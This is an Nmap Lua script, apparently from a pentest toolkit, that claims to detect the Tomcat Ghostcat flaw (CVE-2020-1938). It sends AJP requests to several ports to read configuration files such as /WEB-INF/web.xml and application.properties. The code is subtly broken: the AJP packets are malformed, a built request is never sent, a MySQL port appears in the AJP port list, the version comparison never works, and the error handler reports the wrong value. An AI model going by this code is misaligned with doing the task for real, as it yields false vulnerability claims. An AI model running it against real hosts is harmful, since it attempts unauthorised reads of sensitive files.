local stdnse = require "stdnse"
local http = require "http"

description = [[Detects Apache Tomcat Ghostcat (CVE-2020-1938) via AJP file read and HTTP version fingerprinting.]]
author = "HackIT Framework"
license = "HackIT Framework — Internal Use Only"
categories = {"vuln", "safe"}

portrule = function(host, port) return port.protocol == "tcp" and port.state == "open" and (port.service == "http" or port.number == 8009) end

local function check_ajp(host, port_num, path)
  local sock = nmap.new_socket()
  sock:set_timeout(8000)
  local ok, err = sock:connect(host.ip, port_num)
  if not ok then sock:close(); return nil end

  local path_bytes = {}
  for i = 1, #path do
    path_bytes[i] = string.byte(path, i)
  end

  local path_len = #path
  local prefix = string.char(0x12, 0x34) .. string.char(0x00, 0x00, 0x00, 0x00 + path_len + 4) ..
    string.char(0x02) .. string.char(0x00, 0x00, path_len + 1) .. path .. string.char(0x00)

  local forward_request = string.char(
    0x12, 0x34, 0x00, 0x00, 0x00, 0x00 + path_len + 10,
    0x02, 0x00, 0x00, path_len + 1
  ) .. path .. string.char(0x00) ..
    string.char(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)

  local send_ok, send_err = sock:send(prefix)
  if not send_ok then sock:close(); return nil end

  local rcv, recv_err = sock:receive_bytes(2048)
  sock:close()

  if rcv and (#rcv > 20) then
    local data = {}
    for i = 1, math.min(#rcv, 500) do
      data[i] = string.char(rcv:byte(i))
    end
    local body = table.concat(data)
    if body:match("web%-app") or body:match("<%?xml") or body:match("<!DOCTYPE") or body:match("<web-app") or body:match("context%-param") or body:match("Welcome") then
      return body
    end
  end
  return nil
end

local function check_http_version(host, port)
  local req = http.get(host, port, "/")
  if not req then return nil end
  local server = ""
  if req.headers and req.headers["server"] then
    server = type(req.headers["server"]) == "table" and req.headers["server"][1] or req.headers["server"]
  end
  if server:match("[Tt]omcat") or server:match("[Cc]oyote") or server:match("[Jj]etty") then
    local ver = server:match("([%d%.]+)")
    return server, ver
  end
  return server, nil
end

action = function(host, port)
  local ok, result = pcall(function()
    local server_banner, version = check_http_version(host, port)
    local findings = {}
    local ajp_ports = {8009, 3306, 8007, 8010, 9090}

    local targets = {"/WEB-INF/web.xml", "/WEB-INF/jboss-web.xml", "/META-INF/context.xml", "/META-INF/MANIFEST.MF", "/WEB-INF/classes/application.properties"}

    for _, p in ipairs(ajp_ports) do
      for _, tpath in ipairs(targets) do
        local content = check_ajp(host, p, tpath)
        if content then
          table.insert(findings, {port = p, path = tpath, length = #content, preview = content:sub(1, 120)})
        end
      end
    end

    if #findings > 0 then
      local result = stdnse.output_table()
      result.cve = "CVE-2020-1938"
      result.severity = "CRITICAL"
      result.vulnerable = true
      result.server = server_banner or "unknown"
      result.version = version or "unknown"
      result.detail = ("Ghostcat confirmed - AJP file read via %d AJP ports"):format(#findings)
      for i, f in ipairs(findings) do
        result[("finding_%d"):format(i)] = ("AJP port %d served %s (%d bytes)"):format(f.port, f.path, f.length)
      end
      if version and tonumber(version) and tonumber(version) < 9 then
        result.version_note = ("Tomcat %s is within vulnerable range"):format(version)
      end
      return result
    end

    local result = stdnse.output_table()
    result.cve = "CVE-2020-1938"
    result.severity = "LOW"
    result.vulnerable = false
    result.server = server_banner or "unknown"
    result.version = version or "unknown"
    result.detail = "No Ghostcat vulnerability detected"
    return result
  end)
  if not ok then
    local result = stdnse.output_table()
    result.cve = "CVE-2020-1938"
    result.severity = "MEDIUM"
    result.vulnerable = false
    result.detail = "Error during scan: " .. tostring(result)
    result.error = true
    return result
  end
  return result
end
